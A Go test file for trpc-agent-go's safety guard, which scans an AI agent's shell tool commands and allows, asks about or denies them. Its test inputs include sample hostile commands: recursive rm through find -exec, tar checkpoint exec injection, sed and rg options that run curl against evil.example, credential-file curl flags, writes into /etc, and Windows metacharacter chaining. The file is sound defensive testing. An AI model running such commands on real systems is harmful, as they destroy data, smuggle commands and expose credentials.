//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"runtime"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestCommandLiteralsDoNotMasqueradeAsExecutableHazards(t *testing.T) {
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	for _, command := range []string{
		`grep 'rm -rf /' README.md`,
		`echo 'while true'`,
		`grep 'https://evil.example' fixtures.txt`,
	} {
		t.Run(command, func(t *testing.T) {
			report, scanErr := guard.Scan(
				context.Background(), commandRequest(BackendWorkspace, command),
			)
			if scanErr != nil {
				t.Fatalf("Scan() error = %v", scanErr)
			}
			if report.Decision != tool.PermissionActionAllow {
				t.Fatalf("decision = %s, want allow; matches=%+v", report.Decision, report.Matches)
			}
		})
	}
}

func TestDependencyAliasesRequireReview(t *testing.T) {
	policy := testPolicy()
	policy.Commands.Allowed = append(policy.Commands.Allowed, "python", "npx")
	guard, err := New(policy)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	for _, command := range []string{
		"python -m pip install requests",
		"npm i left-pad",
		"npm ci",
		"go get example.com/module",
		"npx eslint .",
	} {
		t.Run(command, func(t *testing.T) {
			report, scanErr := guard.Scan(
				context.Background(), commandRequest(BackendWorkspace, command),
			)
			if scanErr != nil {
				t.Fatalf("Scan() error = %v", scanErr)
			}
			if !hasRule(report, "dependency.change") {
				t.Fatalf("missing dependency.change: %+v", report.Matches)
			}
		})
	}
}

func TestSleepParsesSeparatorAndCumulativeOperands(t *testing.T) {
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	for _, command := range []string{"sleep -- 121", "sleep 70 60"} {
		t.Run(command, func(t *testing.T) {
			report, scanErr := guard.Scan(
				context.Background(), commandRequest(BackendWorkspace, command),
			)
			if scanErr != nil {
				t.Fatalf("Scan() error = %v", scanErr)
			}
			if report.Decision != tool.PermissionActionDeny ||
				!hasRule(report, "resource.long_sleep") {
				t.Fatalf("report = %+v", report)
			}
		})
	}
	report, err := guard.Scan(
		context.Background(), commandRequest(BackendWorkspace, "sleep -- 1"),
	)
	if err != nil || report.Decision != tool.PermissionActionAllow {
		t.Fatalf("short sleep report=%+v err=%v", report, err)
	}
}

func TestGitRemoteOperationsApplyNetworkPolicy(t *testing.T) {
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	tests := []struct {
		command string
		want    tool.PermissionAction
		ruleID  string
	}{
		{command: "git status", want: tool.PermissionActionAllow},
		{command: "git clone ../fixture", want: tool.PermissionActionAllow},
		{command: "git clone https://go.dev/repo", want: tool.PermissionActionAllow},
		{command: "git clone git@evil.example:org/repo.git", want: tool.PermissionActionDeny, ruleID: "network.denied"},
		{command: "git clone evil.example:repo", want: tool.PermissionActionDeny, ruleID: "network.denied"},
		{command: "git --git-dir /tmp/repo clone git@evil.example:repo", want: tool.PermissionActionDeny, ruleID: "network.denied"},
		{command: "git fetch", want: tool.PermissionActionDeny, ruleID: "network.review"},
	}
	for _, test := range tests {
		t.Run(test.command, func(t *testing.T) {
			report, scanErr := guard.Scan(
				context.Background(), commandRequest(BackendWorkspace, test.command),
			)
			if scanErr != nil {
				t.Fatalf("Scan() error = %v", scanErr)
			}
			if report.Decision != test.want {
				t.Fatalf("decision = %s, want %s; matches=%+v", report.Decision, test.want, report.Matches)
			}
			if test.ruleID != "" && !hasRule(report, test.ruleID) {
				t.Fatalf("missing %s: %+v", test.ruleID, report.Matches)
			}
		})
	}
}

func TestNetworkCredentialFileOptionsFailClosed(t *testing.T) {
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	tests := []struct {
		command string
		want    tool.PermissionAction
		ruleID  string
	}{
		{command: "curl --netrc https://go.dev", want: tool.PermissionActionDeny, ruleID: "credential.file"},
		{command: "curl --netrc-file ./netrc https://go.dev", want: tool.PermissionActionDeny, ruleID: "credential.file"},
		{command: "curl --key ./client.pem https://go.dev", want: tool.PermissionActionDeny, ruleID: "credential.file"},
		{command: "curl -H @headers.txt https://go.dev", want: tool.PermissionActionAsk, ruleID: "network.local_read"},
		{command: "wget --private-key ./client.pem https://go.dev", want: tool.PermissionActionDeny, ruleID: "credential.file"},
	}
	for _, test := range tests {
		t.Run(test.command, func(t *testing.T) {
			report, scanErr := guard.Scan(
				context.Background(), commandRequest(BackendWorkspace, test.command),
			)
			if scanErr != nil {
				t.Fatalf("Scan() error = %v", scanErr)
			}
			if report.Decision != test.want || !hasRule(report, test.ruleID) {
				t.Fatalf("report = %+v", report)
			}
		})
	}
}

func TestHostExecutionRequiresAmbientEnvironmentReview(t *testing.T) {
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	request := commandRequest(BackendHost, "go test ./tool/safety")
	request.YieldMS = intPointer(0)
	report, err := guard.Scan(context.Background(), request)
	if err != nil {
		t.Fatalf("Scan() error = %v", err)
	}
	if report.Decision != tool.PermissionActionAsk ||
		!hasRule(report, "host.environment_inheritance") ||
		hasRule(report, "host.long_session") {
		t.Fatalf("report = %+v", report)
	}
}

func TestWindowsHostShellMetacharactersAreRejected(t *testing.T) {
	for _, marker := range []string{"'", "^", "&", "|", "<", ">", "%", "!", "\r", "\n"} {
		if got, ok := windowsHostShellMetacharacter("echo safe" + marker + "whoami"); !ok || got != marker {
			t.Fatalf("marker %q not detected: got=%q ok=%v", marker, got, ok)
		}
	}
	if _, ok := windowsHostShellMetacharacter("go test ./tool/safety"); ok {
		t.Fatal("simple command was rejected")
	}
	if runtime.GOOS != "windows" {
		return
	}
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	request := commandRequest(BackendHost, `echo 'hello & whoami & rem '`)
	request.YieldMS = intPointer(0)
	report, err := guard.Scan(context.Background(), request)
	if err != nil {
		t.Fatalf("Scan() error = %v", err)
	}
	if report.Decision != tool.PermissionActionDeny ||
		!hasRule(report, "host.windows_shell") {
		t.Fatalf("report = %+v", report)
	}
}

func TestSessionAndExecutionIdentifiersRequireOwnershipReview(t *testing.T) {
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	sessionReport, err := guard.Scan(context.Background(), Request{
		ToolName: "workspace_write_stdin", Backend: BackendWorkspace,
		SessionID: "session-from-another-invocation",
	})
	if err != nil {
		t.Fatalf("session Scan() error = %v", err)
	}
	if sessionReport.Decision != tool.PermissionActionAsk ||
		!hasRule(sessionReport, "session.ownership") {
		t.Fatalf("session report = %+v", sessionReport)
	}

	executionReport, err := guard.Scan(context.Background(), Request{
		ToolName: "execute_code", Backend: BackendCode,
		ExecutionID: "workspace-from-another-invocation",
		CodeBlocks:  []CodeBlock{{Language: "go", Code: "package main"}},
		TimeoutMS:   10_000, MaxOutputBytes: 4096,
	})
	if err != nil {
		t.Fatalf("execution Scan() error = %v", err)
	}
	if executionReport.Decision != tool.PermissionActionAsk ||
		!hasRule(executionReport, "code.workspace_reuse") {
		t.Fatalf("execution report = %+v", executionReport)
	}
}

func TestHostYieldPresencePreservesForegroundSemantics(t *testing.T) {
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	request := commandRequest(BackendHost, "go test ./tool/safety")
	withDefault, err := guard.Scan(context.Background(), request)
	if err != nil {
		t.Fatalf("default-yield Scan() error = %v", err)
	}
	if !hasRule(withDefault, "host.long_session") {
		t.Fatalf("default yield report = %+v", withDefault)
	}
	request.YieldMS = intPointer(0)
	foreground, err := guard.Scan(context.Background(), request)
	if err != nil {
		t.Fatalf("foreground Scan() error = %v", err)
	}
	if hasRule(foreground, "host.long_session") {
		t.Fatalf("explicit zero yield report = %+v", foreground)
	}
}

func TestCommandReExecutionOptionsAreDenied(t *testing.T) {
	policy := testPolicy()
	policy.Commands.Allowed = append(policy.Commands.Allowed, "find", "tar")
	guard, err := New(policy)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	for _, command := range []string{
		`find work -exec r\m -rf {} +`,
		`find work -okdir rm -rf {} +`,
		`tar --checkpoint=1 --checkpoint-action=exec=whoami -cf out.tar work`,
		`tar --to-command whoami -xf in.tar`,
		`tar --checkpoint-action exec=whoami -cf out.tar work`,
		`tar -I /tmp/helper -cf out.tar work`,
	} {
		t.Run(command, func(t *testing.T) {
			report, scanErr := guard.Scan(
				context.Background(), commandRequest(BackendWorkspace, command),
			)
			if scanErr != nil {
				t.Fatalf("Scan() error = %v", scanErr)
			}
			if report.Decision != tool.PermissionActionDeny ||
				!hasRule(report, "shell.wrapper") {
				t.Fatalf("report = %+v", report)
			}
		})
	}
}

func TestTextProcessorsWithExecutionOptionsAreDenied(t *testing.T) {
	policy := testPolicy()
	policy.Commands.Allowed = append(policy.Commands.Allowed, "sed", "rg")
	guard, err := New(policy)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	for _, command := range []string{
		`sed 'e curl https://evil.example' input.txt`,
		`rg --pre 'curl https://evil.example' pattern .`,
	} {
		t.Run(command, func(t *testing.T) {
			report, scanErr := guard.Scan(
				context.Background(), commandRequest(BackendWorkspace, command),
			)
			if scanErr != nil {
				t.Fatalf("Scan() error = %v", scanErr)
			}
			if report.Decision != tool.PermissionActionDeny ||
				!hasRule(report, "shell.wrapper") {
				t.Fatalf("report = %+v", report)
			}
		})
	}
}

func TestCurlOutputDirectoryCannotTargetSystemPath(t *testing.T) {
	guard, err := New(testPolicy())
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	report, err := guard.Scan(
		context.Background(),
		commandRequest(BackendWorkspace, "curl --output-dir /etc -O https://go.dev/file"),
	)
	if err != nil {
		t.Fatalf("Scan() error = %v", err)
	}
	if report.Decision != tool.PermissionActionDeny ||
		!hasRule(report, "destructive.system_write") {
		t.Fatalf("report = %+v", report)
	}
}
